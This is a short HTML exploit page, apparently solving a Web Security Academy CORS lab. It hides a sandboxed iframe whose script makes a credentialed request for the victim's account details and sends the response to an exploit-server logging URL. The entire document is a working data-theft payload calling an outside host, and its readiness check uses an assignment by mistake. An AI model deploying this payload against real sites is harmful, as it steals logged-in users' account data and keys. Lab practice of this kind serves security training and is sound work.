<html>
    <body>
        <iframe style="display:none;"
         sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://0a9f002403627eaa805a62db009c0038.web-security-academy.net'
         xhr.onreadystatechange = function() {
            if (xhr.readyState = XMLHttpRequest.DONE) {
                fetch('https://exploit-0a1100a103bb7e3d807861d501f600a7.exploit-server.net/exploit/log?key=' + xhr.responseText)
            }
         }
            xhr.open('GET',url + '/accountDetails', true);
         xhr.withCredentials =true; 
         xhr.send(null);
        </script> </iframe>
    </body>
</html>